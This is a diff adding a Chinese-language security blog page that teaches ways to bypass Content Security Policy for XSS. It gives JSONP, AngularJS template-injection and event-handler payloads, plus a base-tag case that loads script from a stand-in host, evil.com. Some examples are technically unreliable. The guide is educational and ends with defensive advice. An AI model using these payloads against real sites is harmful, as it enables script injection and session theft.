@@ -1,0 +1,190 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>XSS绕过CSP的几种思路 — DARKSEC</title>
+<meta name="description" content="当目标有CSP保护时，如何寻找bypass点">
+<link rel="icon" href="/assets/images/cat-favicon.svg">
+<link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;500;700;900&family=Inter:wght@300;400;500;600;700&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="/css/style.css">
+</head>
+<body>
+<div class="container">
+  <header>
+    <a href="/" class="logo">DARK<span>SEC</span> 🐱</a>
+    <nav>
+      <a href="/">首页</a>
+      <a href="/posts/" class="active">文章</a>
+      <a href="/tags/">标签</a>
+      <a href="/about.html">关于</a>
+    </nav>
+    <button class="mobile-menu" onclick="document.querySelector('nav').classList.toggle('show')">☰</button>
+  </header>
+
+  <main>
+    <a href="/" class="back-link">← 返回首页</a>
+
+    <article>
+      <div class="article-header">
+        <div class="category">◆ 注入攻击 / XSS</div>
+        <h1>XSS绕过CSP的几种思路</h1>
+        <div class="article-meta">
+          <span>📅 2026-05-15</span>
+          <span>⏱ 9 min read</span>
+          <span>🏷 XSS / CSP绕过</span>
+        </div>
+      </div>
+
+      <div class="article-content">
+        <div class="toc">
+          <h4>◆ 目录</h4>
+          <ul>
+            <li><a href="#overview">概述</a></li>
+            <li><a href="#csp-basics">CSP基础</a></li>
+            <li><a href="#bypass-techniques">绕过技巧</a></li>
+            <li><a href="#case-studies">实战案例</a></li>
+            <li><a href="#tools">工具推荐</a></li>
+            <li><a href="#defense">防御建议</a></li>
+          </ul>
+        </div>
+
+        <h2 id="overview">概述</h2>
+        <p>Content Security Policy (CSP) 是现代Web应用的重要安全机制，可以有效防止XSS攻击。然而，配置不当的CSP仍然可以被绕过。本文介绍几种常见的CSP绕过思路。</p>
+
+        <blockquote>
+          <p>🐱 猫猫提示：CSP就像给猫咪戴的项圈，如果项圈太松，猫咪还是会跑掉 nya~</p>
+        </blockquote>
+
+        <h2 id="csp-basics">CSP基础</h2>
+        <p>CSP通过HTTP头或meta标签定义，控制页面可以加载哪些资源：</p>
+
+        <pre><code># 常见CSP头
+Content-Security-Policy: default-src 'self'; script-src 'self' 'unsafe-inline' 'unsafe-eval'; style-src 'self' 'unsafe-inline'</code></pre>
+
+        <p><strong>关键指令：</strong></p>
+        <ul>
+          <li><code>default-src</code>：默认策略</li>
+          <li><code>script-src</code>：脚本来源</li>
+          <li><code>style-src</code>：样式来源</li>
+          <li><code>img-src</code>：图片来源</li>
+          <li><code>connect-src</code>：AJAX/WebSocket来源</li>
+        </ul>
+
+        <h2 id="bypass-techniques">绕过技巧</h2>
+
+        <h3>1. JSONP绕过</h3>
+        <p>如果CSP允许某些CDN域名，可以利用这些域名上的JSONP接口：</p>
+        <pre><code># 利用Google Analytics的JSONP
+https://www.google.com/jsapi?callback=alert(1)
+
+# 利用jQuery的JSONP
+https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js
+
+# 利用其他CDN的JSONP
+https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.6.0/angular.min.js</code></pre>
+
+        <h3>2. 基于CSP报告的绕过</h3>
+        <p>如果CSP配置了report-uri，可能泄露信息：</p>
+        <pre><code># CSP头
+Content-Security-Policy: script-src 'self'; report-uri /csp-report
+
+# 报告可能泄露的信息
+{
+  "csp-report": {
+    "blocked-uri": "http://evil.com/evil.js",
+    "document-uri": "http://target.com/page",
+    "violated-directive": "script-src 'self'"
+  }
+}</code></pre>
+
+        <h3>3. 基于Angular的绕过</h3>
+        <p>如果页面使用了Angular，可以利用其模板注入：</p>
+        <pre><code># Angular模板注入
+{{constructor.constructor('alert(1)')()}}
+
+# 利用Angular的ng-app
+<div ng-app ng-csp>{{$eval.constructor('alert(1)')()}}</div></code></pre>
+
+        <h3>4. 基于Vue的绕过</h3>
+        <pre><code># Vue模板注入
+{{constructor.constructor('alert(1)')()}}
+
+# 利用Vue的v-bind
+<div v-bind:id="'alert(1)'"></div></code></pre>
+
+        <h3>5. 基于innerHTML的绕过</h3>
+        <pre><code># 如果页面使用innerHTML插入内容
+<img src=x onerror=alert(1)>
+<svg onload=alert(1)>
+<body onload=alert(1)></code></pre>
+
+        <h2 id="case-studies">实战案例</h2>
+        
+        <h3>案例1：JSONP绕过Google CSP</h3>
+        <pre><code># 目标CSP
+Content-Security-Policy: script-src https://www.google.com https://apis.google.com
+
+# 利用Google的JSONP
+https://www.google.com/jsapi?callback=alert
+
+# Payload
+<script src="https://www.google.com/jsapi?callback=alert"></script></code></pre>
+
+        <h3>案例2：CDN绕过</h3>
+        <pre><code># 目标CSP
+Content-Security-Policy: script-src https://cdnjs.cloudflare.com
+
+# 寻找CDN上的危险库
+https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.6.0/angular.min.js
+
+# Payload
+<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.6.0/angular.min.js"></script>
+<div ng-app>{{constructor.constructor('alert(1)')()}}</div></code></pre>
+
+        <h3>案例3：base-uri绕过</h3>
+        <pre><code># 目标CSP
+Content-Security-Policy: script-src 'self'; base-uri 'self'
+
+# 如果页面使用相对路径加载脚本
+<base href="https://evil.com/">
+<script src="evil.js"></script></code></pre>
+
+        <h2 id="tools">工具推荐</h2>
+        <ul>
+          <li><strong>CSP Evaluator</strong>：Google的CSP评估工具</li>
+          <li><strong>CSP Bypass</strong>：自动化CSP绕过工具</li>
+          <li><strong>JSFuck</strong>：JavaScript混淆工具</li>
+          <li><strong>Angular XSS</strong>：Angular模板注入工具</li>
+        </ul>
+
+        <h2 id="defense">防御建议</h2>
+        <ul>
+          <li>使用严格的CSP策略，避免<code>'unsafe-inline'</code>和<code>'unsafe-eval'</code></li>
+          <li>定期审计CSP配置</li>
+          <li>使用nonce或hash来允许特定的内联脚本</li>
+          <li>避免使用通配符<code>*</code></li>
+          <li>测试CSP配置的有效性</li>
+        </ul>
+
+        <div style="text-align:center;padding:40px 0 20px;font-size:0.9rem;color:#c0c0d0;font-style:italic;">
+          ~ 感谢阅读 nya~ 🐱✨
+        </div>
+
+        <div class="article-tags">
+          <span class="tag pink">XSS</span>
+          <span class="tag">CSP绕过</span>
+          <span class="tag purple">Web安全</span>
+        </div>
+      </div>
+    </article>
+  </main>
+
+  <footer>
+    <div class="footer-content">
+      <p>© 2026 <span class="neon-text">DARKSEC</span> CYBERCAT SECURITY LAB 🐾</p>
+    </div>
+  </footer>
+</div>
+</body>
+</html>
